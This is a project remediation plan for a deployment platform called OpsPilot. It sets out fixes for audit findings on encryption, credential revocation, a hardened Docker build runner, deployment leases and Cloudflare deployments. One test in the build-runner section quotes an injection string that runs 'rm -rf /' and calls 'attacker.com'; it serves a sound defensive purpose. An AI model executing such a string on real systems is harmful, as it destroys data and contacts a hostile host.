# OpsPilot — Project Foundation Remediation Plan

> **Audience:** Core Maintainers, Security Team, Platform Engineers  
> **Status:** Authoritative Foundation Remediation Plan  
> **Date:** November 2026  
> **Precondition:** Must be executed before Phase 1 production implementation

---

## 1. Executive Summary

This remediation plan establishes the precise execution sequence to resolve the 10 critical and high-severity findings uncovered during the adversarial audit. 

No feature development or general application work may commence until these blockers are remediated in their strict dependency order. Every task defines its exact scope, affected packages, acceptance criteria, test strategy, and required approval tier.

---

## 2. Governance Tiers: Approved vs. Requiring Owner Approval

```mermaid
flowchart TD
    subgraph Tier 1: Project Owner Approval Required
        LIC["Decision: License Selection (Apache-2.0 vs MIT)"]
        SCH["Schema Migration 0002 (Adding wrapped_dek & leases)"]
    end

    subgraph Tier 2: Architecturally Approved (Pre-Implementation Blockers)
        B1["1. SEC-02 & SEC-01: Envelope Encryption Service & Fail-Closed"]
        B2["2. SEC-05: Active Integration & Tenant Scoping Enforcement"]
        B3["3. SEC-06: HardenedBuildRunner Entrypoint & Invocation"]
        B4["4. ENG-03: Database Leases & Crash Recovery Worker"]
        B5["5. ENG-01: Provider Stabilization & Status Polling"]
        B6["6. WRK-01: Transactional Cloudflare Worker Version Deployment"]
        B7["7. API-01 & PGS-01: Pages Direct Upload Protocol & Functions Build"]
        B8["8. Live Infrastructure Test Fixtures"]
        B9["9. UI-01: Scaffold apps/dashboard Structure"]
    end

    LIC --> B1
    SCH --> B1
    B1 --> B2
    B2 --> B3
    B3 --> B4
    B4 --> B5
    B5 --> B6
    B6 --> B7
    B7 --> B8
    B8 --> B9
```

| ID | Finding / Task | Category | Tier | Status |
|---|---|---|---|---|
| **DEC-LIC** | Open-Source License Selection | Governance | Project Owner | **Pending Owner Approval** |
| **SCH-02** | Migration `0002_envelope_encryption_and_leases.sql` | Database | Project Owner | **Pending Owner Approval** |
| **BLK-01** | `SEC-02`: Remove Fallback Key & Fail Closed | Security | Architecture Approved | Ready for Scheduling |
| **BLK-02** | `SEC-01`: NIST SP 800-57 Envelope Encryption | Security | Architecture Approved | Ready for Scheduling |
| **BLK-03** | `SEC-05`: Revoked Integration Decryption Prevention | Security | Architecture Approved | Ready for Scheduling |
| **BLK-04** | `SEC-06`: HardenedBuildRunner & `eval` Removal | Execution | Architecture Approved | Ready for Scheduling |
| **BLK-05** | `ENG-03`: Deployment Lease & Crash Recovery Engine | Reliability | Architecture Approved | Ready for Scheduling |
| **BLK-06** | `ENG-01`: Provider Stabilization & Edge Propagation | Reliability | Architecture Approved | Ready for Scheduling |
| **BLK-07** | `WRK-01`: Atomic Cloudflare Worker Secrets & Versions | Provider | Architecture Approved | Ready for Scheduling |
| **BLK-08** | `API-01`: Two-Stage Pages Direct Upload Protocol | Provider | Architecture Approved | Ready for Scheduling |
| **BLK-09** | `PGS-01`: Pages Functions Compilation Pipeline | Provider | Architecture Approved | Ready for Scheduling |
| **BLK-10** | `UI-01`: Scaffold `apps/dashboard` Next.js Application | Dashboard | Architecture Approved | Ready for Scheduling |

---

## 3. Detailed Remediation Sequences

### 3.1 Blocker 1 & 2: Genuine Envelope Encryption & Fail-Closed Master Key (`SEC-02`, `SEC-01`)
- **Objective:** Eliminate hardcoded master key fallback and replace deterministic HKDF key derivation with cryptographically random per-record DEKs wrapped with a protected KEK.
- **Affected Packages:** `@opspilot/security`, `@opspilot/database`
- **Schema Impact:** Requires Migration `0002` adding `wrapped_dek`, `kek_id`, `algorithm_version` to `integration_credentials`.
- **Implementation Sequence:**
  1. Update `EnvelopeEncryptionService`:
     - Validate that `OPSPILOT_MASTER_KEY` exists in environment and has exactly 32 bytes (64 hex characters). If missing or invalid, throw `MissingMasterKeyException`.
     - Implement `generateRandomDek(): Buffer` using `crypto.randomBytes(32)`.
     - Wrap DEK using AES-256 Key Wrap (RFC 3394) or AES-256-GCM using the KEK.
     - Encrypt plaintext payload with DEK using AES-256-GCM with 12-byte random IV.
     - Include `organizationId` and `integrationId` as Additional Authenticated Data (AAD).
     - Return `{ encryptedSecret, iv, authTag, wrappedDek, keyVersion, algorithm }`.
  2. Implement unwrap and decrypt workflow verifying AAD and authentication tag.
  3. Update `IntegrationsRepository` to write and read `wrapped_dek`.
- **Test Strategy:**
  - Unit test verifying startup failure when `OPSPILOT_MASTER_KEY` is undefined.
  - Cryptographic test verifying two encryptions of identical plaintext yield different DEKs and ciphertexts.
  - Tamper test verifying ciphertext or AAD manipulation throws `AuthenticationTagValidationException`.
  - Cross-tenant test verifying tenant B cannot decrypt tenant A's secret even with a valid ciphertext.

### 3.2 Blocker 3: Integration Status and Revocation Enforcement (`SEC-05`)
- **Objective:** Prevent decryption of credentials belonging to non-active or revoked integrations.
- **Affected Packages:** `@opspilot/database`
- **Implementation Sequence:**
  1. Modify `IntegrationsRepository.getDecryptedSecret()` to execute an `INNER JOIN integrations ON integrations.id = integration_credentials.integration_id`.
  2. Add predicate `WHERE integrations.id = $1 AND integrations.organization_id = $2 AND integrations.status = 'active'`.
  3. If status is `revoked`, `suspended`, or record is missing, throw `IntegrationNotActiveException`.
- **Test Strategy:**
  - Create integration, mark status as `revoked`. Verify `getDecryptedSecret` throws domain exception and decryptor is never invoked.

### 3.3 Blocker 4: Hardened Build Runner & Entrypoint Remediation (`SEC-06`)
- **Objective:** Eliminate shell `eval` vulnerability and enforce build runner invocation through a trusted host-side Runner Orchestrator with zero Docker socket access inside build containers.
- **Affected Packages:** `docker/runners/`, `@opspilot/deployment-providers`, `@opspilot/application`
- **Implementation Sequence:**
  1. Modify `docker/runners/scripts/build-entrypoint.sh`:
     - Remove `eval "${OPSPILOT_BUILD_COMMAND}"`.
     - Replace with strict argument execution via `exec "$@"`.
  2. Implement trusted host-side Runner Orchestrator in `HardenedBuildRunner`:
     - Executes on the host, controlling the Docker daemon via host credentials.
     - Spawns isolated leaf build containers (`docker run`) with mandatory constraints:
       - `--user 10001:10001`, `--read-only`, `--tmpfs /tmp:rw,noexec,nosuid,size=512m`.
       - `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--memory=2g`, `--cpus=2.0`, `--pids-limit=100`.
       - Network firewall: `--network=isolated-build-net` (drops `169.254.169.254` and RFC 1918 subnets).
     - **Strict Non-Exposure:** Never mounts `/var/run/docker.sock` into the build container; build containers have zero control over Docker.
     - **Bounded I/O Boundary:** Mounts only the bounded workspace directory (`/build:rw`); collects build artifacts from the bounded output directory (`dist/` or `.worker/`) and verifies SHA-256 digests.
  3. Integrate build runner orchestrator into `CloudflareWorkersProvider` and `CloudflarePagesProvider` pre-deployment pipeline.
- **Test Strategy:**
  - Integration test verifying command injection attempts (e.g., `; rm -rf /; curl attacker.com`) are treated as literal arguments.
  - Container test verifying non-root UID execution, read-only root filesystem, and absence of `/var/run/docker.sock`.

### 3.4 Blocker 5: Deployment Leases & Worker Crash Reconciliation (`ENG-03`)
- **Objective:** Enable automatic detection and recovery of abandoned or crashed deployment jobs.
- **Affected Packages:** `@opspilot/database`, `@opspilot/application`, `apps/worker`
- **Implementation Sequence:**
  1. Add `lease_expires_at` and `worker_id` columns to `deployments` table via Migration `0002`.
  2. In `DeploymentExecutionEngine` (application orchestrator), update lease every 15 seconds during active stages.
  3. Author `DeploymentReconciliationWorker`:
     - Cron job running every 60 seconds.
     - Scans for deployments where `status = 'deploying'` and `lease_expires_at < NOW() - INTERVAL '45 seconds'`.
     - Queries target provider adapter for current status via `DeploymentProviderPort`.
     - Marks timed-out deployments as `Failed` with reason `WORKER_HEARTBEAT_TIMEOUT`.
- **Test Strategy:**
  - Unit test simulating worker termination; verify reconciliation cron detects expired lease and marks deployment `Failed`.

### 3.5 Blocker 6: Provider Stabilization & Status Polling (`ENG-01`)
- **Objective:** Prevent premature health checks before provider infrastructure is fully deployed and edge routers have converged.
- **Affected Packages:** `@opspilot/application`, `@opspilot/deployment-providers`
- **Implementation Sequence:**
  1. In `DeploymentExecutionEngine` (application orchestrator), insert explicit stage `AwaitingStabilization` between `Deploying` and `HealthChecking`.
  2. Implement polling loop calling `provider.getStatus(deploymentId)` via `DeploymentProviderPort` with exponential backoff:
     - Configurable timeout (default: 5 minutes for ECS, 60 seconds for Cloudflare).
     - Success condition: provider returns status `Healthy` or `Active`.
  3. Only transition to `HealthChecking` after stabilization is confirmed.
- **Test Strategy:**
  - Test engine with mock provider returning `Deploying` three times before `Healthy`; verify engine waits before invoking health checker.

### 3.6 Blocker 7: Transactional Cloudflare Worker Version Deployment (`WRK-01`)
- **Objective:** Prevent production configuration drift caused by updating worker secrets before script deployment succeeds.
- **Affected Packages:** `@opspilot/deployment-providers`
- **Implementation Sequence:**
  1. Use Cloudflare Workers Versions API:
     - Upload script as an unreleased version.
     - Attach environment bindings and secrets to that specific version.
     - Promote the version to 100% traffic only after upload and validation succeed.
- **Test Strategy:**
  - Simulate script upload failure; verify existing production version and its secrets remain intact.

### 3.7 Blocker 8 & 9: Real Cloudflare Pages Direct Upload & Functions Compilation (`API-01`, `PGS-01`)
- **Objective:** Implement the authentic Cloudflare Pages two-stage manifest upload protocol and compile `/functions` into `_worker.js`.
- **Affected Packages:** `@opspilot/deployment-providers`
- **Implementation Sequence:**
  1. Compute SHA-256 hashes for all build output files.
  2. Call POST `/pages/projects/{projectName}/upload-tokens` with the manifest `{ [filePath]: hash }`.
  3. Cloudflare returns array of missing hashes.
  4. Upload missing hashes concurrently with bounded concurrency (max 5 parallel uploads).
  5. If `functions/` directory exists in repository, run `@cloudflare/workers-honeycomb` or `wrangler pages functions build` inside the build runner to produce `_worker.js` before packaging.
- **Test Strategy:**
  - Mock API test with multi-stage negotiation simulating missing hashes.
  - Fixture test compiling sample TypeScript function into `_worker.js`.

### 3.8 Blocker 10: Scaffold `apps/dashboard` Frontend (`UI-01`)
- **Objective:** Scaffold the Next.js 14+ frontend application with App Router, TypeScript, and Tailwind CSS.
- **Affected Packages:** `apps/dashboard`
- **Implementation Sequence:**
  1. Scaffold `apps/dashboard` with `next.config.mjs`, `package.json`, `tsconfig.json`, `tailwind.config.ts`.
  2. Implement API client consuming `@opspilot/contracts`.
  3. Create core views: Projects, Deployments, Incidents, Settings.
- **Test Strategy:**
  - Next.js build verification and React Testing Library component tests.

---

## 4. Execution Preconditions

Before any engineer or agent writes code for these blockers:
1. **Project Owner must review and sign off on:**
   - License selection (Apache-2.0).
   - Migration `0002` schema additions (`wrapped_dek`, `lease_expires_at`).
2. **Foundational documentation must be completed and merged.**
3. **Branching policy must be established:** All fixes must be submitted via isolated feature branches conforming to Conventional Commits.
